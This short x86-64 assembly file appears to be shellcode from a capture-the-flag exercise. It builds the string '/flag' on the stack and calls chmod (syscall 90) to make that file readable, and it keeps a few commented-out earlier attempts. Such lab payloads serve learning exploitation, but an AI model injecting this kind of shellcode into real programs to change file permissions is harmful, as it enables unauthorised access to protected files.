.global _start
_start:
.intel_syntax noprefix

#mov rdi, [rip + flagText]
#push rdi

mov al, 90
mov sil, 0xFF

#mov rdi, [rip + flagText]
#push rdi

mov r12, 0x12340067616c662f
push r12
mov rdi, rsp

syscall
